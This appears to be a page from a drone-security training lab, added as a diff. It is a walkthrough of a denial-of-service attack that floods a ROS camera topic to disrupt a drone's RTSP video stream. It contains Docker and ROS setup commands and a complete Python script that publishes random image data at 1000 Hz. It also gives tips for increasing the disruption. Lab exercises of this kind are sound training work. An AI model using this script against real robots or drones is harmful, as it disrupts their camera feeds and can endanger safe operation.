@@ -1,0 +1,98 @@
+title: Camera Feed ROS Topic Flooding
+order: 6
+description: Flooding the ROS topic to disrupt a the drone's RTSP stream.
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Denial of Service
+  - text: ROS Topic Flood Attack
+
+sections:
+  - title: Description
+    content: |
+      This attack involves flooding a ROS topic with large amounts of data to overwhelm the system's resources,
+      leading to disruption of services such as an RTSP stream. In this scenario, we target the `webcam/image_raw` topic
+      to disrupt the video stream.
+
+  - title: Resources
+    content:
+      - text: ROS Noetic Docker Image
+        link: https://hub.docker.com/r/osrf/ros
+      - text: ROS Documentation
+        link: https://wiki.ros.org/noetic
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Set Up the ROS Docker Container (Or you can try building ROS from source on Kali)
+        description: |
+          Start by setting up a Docker container on your Kali machine running ROS Noetic. You can pull the ROS Noetic Docker image from Docker Hub:
+          ```sudo docker pull ros:noetic-ros-base
+          ```
+
+          Run the container with a static IP, connecting it to the `simulator` network:
+          ```docker run -it --network=simulator --ip=10.13.0.10 --name ros_noetic_container ros:noetic-ros-base bash
+          ```
+
+      - title: Step 2. Configure ROS Environment
+        description: |
+          Inside the Docker container, configure the ROS environment to point to the ROS master on the server:
+          ```export ROS_MASTER_URI=http://10.13.0.5:11311
+          export ROS_IP=10.13.0.10
+          source /opt/ros/noetic/setup.bash
+          ```
+
+      - title: Step 3. Install Python and Required Packages
+        description: |
+          If Python is not installed, install it along with any required packages:
+          ```apt-get update
+          apt-get install python3 python3-pip nano
+          ```
+
+      - title: Step 4. Create the ROS Flood Script
+        description: |
+          Create a Python script `ros-topic-flood.py` that will flood the `webcam/image_raw` topic with fake image data:
+          ```#!/usr/bin/env python3
+
+          import rospy
+          from sensor_msgs.msg import Image
+          import numpy as np
+
+          def flood_topic():
+              rospy.init_node('image_flooder', anonymous=True)
+              pub = rospy.Publisher('/webcam/image_raw', Image, queue_size=10)
+              rate = rospy.Rate(1000)  # 1000 Hz, adjust this as necessary
+
+              while not rospy.is_shutdown():
+                  img = Image()
+                  img.height = 480
+                  img.width = 640
+                  img.encoding = "rgb8"
+                  img.is_bigendian = 0
+                  img.step = img.width * 3
+                  img.data = np.random.bytes(img.step * img.height)
+                  pub.publish(img)
+                  rate.sleep()
+
+          if __name__ == '__main__':
+              try:
+                  flood_topic()
+              except rospy.ROSInterruptException:
+                  pass
+          ```
+
+      - title: Step 5. Execute the Flood Script
+        description: |
+          Run the flood script to start publishing large amounts of data to the `webcam/image_raw` topic:
+          ```python3 ros-topic-flood.py
+          ```
+
+          This will flood the topic at a high rate, disrupting the RTSP stream.
+
+      - title: Step 6. Monitor the Attack
+        description: |
+          Monitor the ROS server and RTSP stream to observe the impact of the flood attack. You can adjust the rate of flooding or the size of the data to increase the disruption.
+
+      - title: Step 7. Stop the Attack
+        description: |
+          To stop the attack, terminate the script with `Ctrl+C` in the terminal where the flood script is running.
